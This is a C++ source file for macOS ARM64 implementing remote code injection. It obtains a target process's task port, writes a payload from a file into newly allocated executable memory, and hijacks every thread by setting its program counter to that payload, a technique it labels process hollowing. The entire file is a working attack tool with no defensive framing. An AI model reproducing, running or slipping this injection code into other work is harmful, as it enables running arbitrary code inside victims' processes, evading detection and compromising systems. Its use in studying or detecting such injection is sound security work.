#include <mach/mach.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <stdexcept>
#include <string>
#include <cstdlib>

// Get the task port for the target process 
mach_port_t getTaskPort(pid_t pid) {
    // Define the task port
    mach_port_t task;

    // Get the task port for the target process
    kern_return_t kr = task_for_pid(mach_task_self(), pid, &task);

    // Check if the task port was obtained successfully
    if (kr != KERN_SUCCESS) {
        // Failed to get the task port
        std::cerr << "Failed to get task port: " << mach_error_string(kr) << "\n";
        exit(1);
    }

    // Return the task port
    return task;
}

// Inject the payload into the target process
vm_address_t injectPayload(mach_port_t task, const std::vector<uint8_t>& payload) {
    // Define the remote address for the payload
    vm_address_t remoteAddr = 0;
    kern_return_t kr;

    // Allocate memory in the remote task
    kr = vm_allocate(task, &remoteAddr, payload.size(), VM_FLAGS_ANYWHERE);

    // Check if memory allocation was successful
    if (kr != KERN_SUCCESS) {
        // Memory allocation failed
        std::cerr << "Memory allocation failed: " << mach_error_string(kr) << "\n";
        exit(1);
    }

    // Write the payload into the allocated memory
    kr = vm_write(task, remoteAddr, reinterpret_cast<vm_offset_t>(payload.data()), payload.size());

    // Check if memory write was successful
    if (kr != KERN_SUCCESS) {
        // Memory write failed
        std::cerr << "Memory write failed: " << mach_error_string(kr) << "\n";
        exit(1);
    }

    // Make the memory executable
    kr = vm_protect(task, remoteAddr, payload.size(), false, VM_PROT_READ | VM_PROT_EXECUTE);

    // Check if memory protection was successful
    if (kr != KERN_SUCCESS) {
        // Memory protection failed
        std::cerr << "Memory protection failed: " << mach_error_string(kr) << "\n";
        exit(1);
    }

    std::cout << "Payload injected at address: 0x" << std::hex << remoteAddr << "\n";

    // Return the remote address of the injected payload
    return remoteAddr;
}

// Set the instruction pointer to the payload's entry point
void setInstructionPointer(mach_port_t task, mach_vm_address_t remoteAddr) {
    // Define the thread list and count
    thread_act_port_array_t threadList;
    mach_msg_type_number_t threadCount;

    // Get all threads of the target process
    kern_return_t kr = task_threads(task, &threadList, &threadCount);

    // Check if task threads were obtained successfully
    if (kr != KERN_SUCCESS) {
        std::cerr << "Failed to get task threads: " << mach_error_string(kr) << "\n";
        return;
    }

    // Check if no threads were found
    if (threadCount == 0) {
        std::cerr << "No threads found in target process.\n";
        // Deallocate thread list before exiting
        vm_deallocate(mach_task_self(), (vm_address_t)threadList, threadCount * sizeof(thread_act_t));
        // Return without setting instruction pointer
        return;
    }

    // Iterate over all threads
    for (size_t i = 0; i < threadCount; ++i) {
        // Get the thread port
        thread_act_t targetThread = threadList[i];

        // Suspend the thread before modifying
        kr = thread_suspend(targetThread);

        // Check if thread suspension was successful
        if (kr != KERN_SUCCESS) {
            // Failed to suspend the thread
            std::cerr << "Failed to suspend thread: " << mach_error_string(kr) << "\n";
            // Continue to the next thread
            continue;
        }

        // Define the thread state (ARM64)
        arm_thread_state64_t state;
        mach_msg_type_number_t stateCount = ARM_THREAD_STATE64_COUNT;

        // Get the current thread state
        kr = thread_get_state(targetThread, ARM_THREAD_STATE64, (thread_state_t)&state, &stateCount);

        // Check if thread state was obtained successfully
        if (kr != KERN_SUCCESS) {
            // Failed to get the thread state
            std::cerr << "Failed to get thread state: " << mach_error_string(kr) << "\n";
            // Resume the thread before continuing
            thread_resume(targetThread);
            // Continue to the next thread
            continue;
        }

        std::cout << "Original PC for thread " << targetThread << ": 0x" << std::hex << state.__pc << "\n";

        // Update the program counter to point to the injected payload
        state.__pc = remoteAddr;

        std::cout << "New PC for thread " << targetThread << ": 0x" << std::hex << state.__pc << "\n";

        // Set the modified thread state
        kr = thread_set_state(targetThread, ARM_THREAD_STATE64, (thread_state_t)&state, ARM_THREAD_STATE64_COUNT);

        // Check if thread state was set successfully
        if (kr != KERN_SUCCESS) {
            // Failed to set the thread state
            std::cerr << "Failed to set thread state: " << mach_error_string(kr) << "\n";
            // Resume the thread before continuing
            thread_resume(targetThread);
            // Continue to the next thread
            continue;
        }

        std::cout << "Thread state updated successfully for thread: " << targetThread << "\n";

        // Resume the thread after modification
        kr = thread_resume(targetThread);

        // Check if thread resumption was successful
        if (kr != KERN_SUCCESS) {
            // Failed to resume the thread
            std::cerr << "Failed to resume thread: " << mach_error_string(kr) << "\n";
        } else {
            // Thread resumed successfully
            std::cout << "Thread resumed successfully.\n";
        }
    }

    // Deallocate the thread list
    kr = vm_deallocate(mach_task_self(), (vm_address_t)threadList, threadCount * sizeof(thread_act_t));

    // Check if thread list deallocation was successful
    if (kr != KERN_SUCCESS) {
        // Failed to deallocate thread list
        std::cerr << "Failed to deallocate thread list: " << mach_error_string(kr) << "\n";
    }
}

int main(int argc, char** argv) {
    // Check if the PID and payload file were provided
    if (argc < 3) {
        std::cerr << "Usage: " << argv[0] << " <pid> <payload_file>\n";
        return 1;
    }

    // Parse command-line arguments
    pid_t pid = atoi(argv[1]);
    std::string payloadFile = argv[2];

    // Debugging: Print the received arguments
    std::cout << "Target PID: " << pid << "\n";
    std::cout << "Payload file: " << payloadFile << "\n";

    // Ensure absolute path for the payload file
    char absPath[PATH_MAX];
    if (realpath(payloadFile.c_str(), absPath) == nullptr) {
        std::cerr << "Error resolving absolute path for payload file.\n";
        return 1;
    }
    std::cout << "Resolved payload file path: " << absPath << "\n";

    // Read the payload from the file
    std::vector<uint8_t> payload;
    try {
        std::ifstream file(absPath, std::ios::binary | std::ios::ate);
        if (!file.is_open()) {
            throw std::runtime_error("Failed to open payload file.");
        }

        size_t size = file.tellg();
        file.seekg(0, std::ios::beg);

        payload.resize(size);
        file.read(reinterpret_cast<char*>(payload.data()), size);

        std::cout << "Payload file read successfully. Size: " << size << " bytes.\n";
    } catch (const std::exception& e) {
        std::cerr << "Error reading payload file: " << e.what() << "\n";
        return 1;
    }

    // Get the task port for the target process
    mach_port_t task = getTaskPort(pid);

    // Inject the payload into the target process and get the remote address
    vm_address_t remoteAddr = 0;
    try {
        remoteAddr = injectPayload(task, payload);
    } catch (const std::exception& e) {
        std::cerr << "Error injecting payload: " << e.what() << "\n";
        return 1;
    }

    // Set the instruction pointer to the payload's entry point for all threads
    try {
        setInstructionPointer(task, remoteAddr);
    } catch (const std::exception& e) {
        std::cerr << "Error setting instruction pointer: " << e.what() << "\n";
        return 1;
    }

    // Print success message
    std::cout << "Process hollowing complete.\n";

    return 0;
}
